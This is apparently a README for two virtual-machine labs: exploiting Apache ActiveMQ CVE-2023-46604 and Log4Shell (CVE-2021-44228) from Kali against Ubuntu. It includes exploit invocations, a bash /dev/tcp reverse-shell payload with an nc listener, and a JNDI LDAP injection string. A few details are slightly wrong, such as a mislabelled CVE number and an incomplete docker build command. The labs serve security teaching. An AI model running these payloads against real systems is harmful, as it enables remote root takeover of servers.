
# CVE-2023-46604 Lab
This lab guides on exploiting vulnerabilities of CVE-2023-46604
## Acknowledgements
 - [Apache ActiveMQ](https://activemq.apache.org/code-overview)
 - [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
## Environment
This lab requires the installation of 2 virtual machines. One Kali Linux machine version 2023.4 and one Ubuntu machine version 22.04.3 LTS. You can download them here:
- [Kali Linux 2023.4](https://kali.download/base-images/kali-2023.4/kali-linux-2023.4-vmware-amd64.7z)
- [Ubuntu 22.04.3 LTS](https://releases.ubuntu.com/22.04.3/ubuntu-22.04.3-desktop-amd64.iso)
- [VMware-workstation-17.5.0 for windows](https://download3.vmware.com/software/WKST-1750-WIN/VMware-workstation-full-17.5.0-22583795.exe)
- [VMware-workstation-17.5.0 for linux](https://download3.vmware.com/software/WKST-1750-LX/VMware-Workstation-Full-17.5.0-22583795.x86_64.bundle)
## Model and system requirements
![](https://github.com/dcm2406/CVE-Lab/blob/master/model.png)

**On Kali Linux machine:**

Install git
```command
$sudo apt install git
```
Install gedit
```command
$sudo apt install gedit
```
**On Ubuntu machine:**

Install git
```command
$sudo apt install git
```
Install openjdk 18
```command
$sudo apt install openjdk-18-jdk
```
Install ActiveMQ 5.18.2 package
```command
$sudo su
$git clone https://github.com/dcm2406/ApacheActiveMQ
$cd ApacheActiveMQ/
$tar -xf apache-activemq-5.18.2-bin.tar.gz
```
## Building server (launch the activemq service)
On Ubuntu machine
Open a terminal window and run the command as below:
```command
$sudo su
$cd ApacheActiveMQ/apache-activemq-5.18.2/bin/linux-x86-64
$./activemq start
```
Check the status of the service:
```command
$./activemq status
```
If the service starts successfully, it will display on the terminal screen as "ActiveMQ Brocker is running".

You can also visit http://127.0.0.1:8161 to open ActiveMQ broker manager.It includes the hostname, version, ID, up time and some other information.
## Exploiting
On Kali Linux machine

Download resources for the exploiting process:
```command
$sudo su
$git clone https://github.com/dcm2406/CVE-2023-46604
$cd CVE-2023-46604
$ls
```
As you can see, we have 2 files exploit.py and poc.xml:
- The poc.xml file contains a piece of malicious code that takes advantage of a vulnerability in the OpenWire protocol.
- The exploit.py file is responsible for HTTP encrypting and sending the poc.xml file to Brocker on the target machine.
Open a web server at the resource path:
```command
$cd CVE-2023-46604
$python3 -m http.server
```
Open a new terminal window to send the poc.xml file to the target's server via the exploit.py file:
```command
$sudo su
$cd CVE-2023-46604
$python3 exploit.py -i 192.168.132.135 -p 61616 --xml http://192.168.132.130:8000/poc.xml
```
After the command is executed, the Calculator application is launched on the target machine. This proves that the vulnerability has been successfully exploited. We continue to create a reverse shell to control the target machine.

Open a new terminal window to listen for reverse shell connections:
```command
$sudo su
$nc -nlvp 4444
```
Return to the previous terminal and edit the poc.xml file:
```command
$gedit poc.xml
```
Replace the value **gnome-calculator** with **bash -i &gt;&amp; /dev/tcp/192.168.132.130/4444 0&gt;&amp;1** and save the file.

Sending malicious code again:
```command
$python3 exploit.py -i 192.168.132.135 -p 61616 --xml http://192.168.132.130:8000/poc.xml
```

The result of this command is that we have obtained the root shell on the target machine. ROOTED!!!
# CVE-2021-44228 Lab

## Acknowledgements
 - [Apache log4j](https://logging.apache.org/log4j/2.x/)
 - [CVE-2023-44228 - log4shell](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
## Environment
This lab requires the installation of 2 virtual machines. Kali Linux machine version 2023.4 and Ubuntu machine version 22.04.3 LTS. You can download them here:
- [Kali Linux 2023.4](https://kali.download/base-images/kali-2023.4/kali-linux-2023.4-vmware-amd64.7z)
- [Ubuntu 22.04.3 LTS](https://releases.ubuntu.com/22.04.3/ubuntu-22.04.3-desktop-amd64.iso)
- [VMware-workstation-17.5.0 for windows](https://download3.vmware.com/software/WKST-1750-WIN/VMware-workstation-full-17.5.0-22583795.exe)
- [VMware-workstation-17.5.0 for linux](https://download3.vmware.com/software/WKST-1750-LX/VMware-Workstation-Full-17.5.0-22583795.x86_64.bundle)

## Model and system requirements

![](https://github.com/dcm2406/CVE-Lab/blob/master/model.png)

**On Kali Linux machine:**

Install git
```command
$sudo apt install git
```
Install gedit
```command
$sudo apt install gedit
```
**On Ubuntu machine:**

Install git
```command
$sudo apt install git
```
Install docker
```command
$sudo apt install docker.io 
```
## Building web server
On Ubuntu machine

Step 1: Download openjdk

```command
$sudo su
$wget https://www.cs.ait.ac.th/~marikhu/installers/jdk-8u20-linux-x64.tar.gz
$tar -xf jdk-8u20-linux-x64.tar.gz
```

Step 2: Download and build docker file
```command
$sudo su
$git clone https://github.com/dcm2406/web-server-cve44228
```
```command
$docker build -t cve44228
$docker run --network host cve44228
```
After completing the above commands, we have a website. To browse the web, you can use the URL: http://<ubuntu_ip>:8080. In this tutorial, the address will look like: http://192.168.132.135:8080
## Exploiting
On the Kali Linux machine, download the necessary resources to exploit the vulnerability

Download poc
```command
$sudo su
$git clone https://github.com/kozmer/log4j-shell-poc
$pip install -r requirement.txt
```
Download openjdk
```command
$sudo su
$wget https://www.cs.ait.ac.th/~marikhu/installers/jdk-8u20-linux-x64.tar.gz

//move the openjdk file to the directory containing the poc file
$mv jdk-8u20-linux-x64.tar.gz <path to the directory containing the poc file>

$tar -xf jdk-8u20-linux-x64.tar.gz   //unzip the file
```

Open a new terminal to listen for reverse shell connections:
```command
$sudo su
$nc -nlvp 9001
```
Launch LDAP and HTTP services with poc file
```command
$sudo su
$cd log4j-shell-poc
$python3 poc.py --userip 192.168.132.130 --lport 9001 --webport 8080
```
The command will return results similar to the following
```terminal
[!] CVE: CVE-2021-44228
Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up LDAP server

[+] Send me: ${jndi:ldap://192.168.132.130:1389/a}

[+] Starting Webserver on port 8080 http://0.0.0.0:8080
Listening on 0.0.0.0:1389
```
Here, we are only interested in the generated jndi value.
Open a web browser and enter the address of the website you created earlier.
Login using jndi value. At this time, netcat terminal receives a connection.
ROOTED!!!

## Documentation
[CVE Research Report](https://drive.google.com/file/d/12NVPsIuQmrhk10GPrPGAjQRah91nYSed/view?usp=sharing)

## Support
For support, email dcm240602@gmail.com

## Authors
- [@dcm2406](https://github.com/dcm2406)
- [@tCu0n9](https://github.com/tCu0n9)
